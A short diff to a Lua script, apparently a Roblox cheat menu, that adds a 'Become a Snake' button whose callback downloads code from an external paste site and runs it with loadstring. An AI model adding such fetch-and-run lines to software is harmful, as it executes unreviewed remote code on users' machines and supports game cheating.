@@ -109,6 +109,17 @@ Player:AddButton({
 })
 
 local Section = Player:AddSection({
+	Name = "Fun Stuff"
+})
+
+Player:AddButton({
+	Name = "Become a Snake",
+	Callback = function()
+                loadstring(game:HttpGet(('https://pastefy.ga/tWBTcE4R/raw'),true))()
+  	end    
+})
+
+local Section = Player:AddSection({
 	Name = "Powers"
 })
 
